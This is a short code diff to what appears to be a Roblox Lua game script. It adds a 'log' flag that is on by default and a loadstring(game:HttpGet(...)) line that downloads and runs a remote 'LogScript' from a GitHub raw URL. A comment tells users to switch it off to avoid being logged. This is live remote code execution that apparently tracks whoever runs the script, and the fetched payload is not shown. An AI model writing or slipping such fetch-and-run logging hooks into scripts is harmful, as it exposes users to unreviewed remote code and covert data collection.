@@ -1,4 +1,10 @@
+--SET LOG FALSE TO NOT BE LOGGED
 
+local log = true 
+
+if log then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/QuickKing/Charlesssss/refs/heads/main/LogScript"))()
+end
 
 local gameId = game.PlaceId  
 if gameId == 6104994594 then
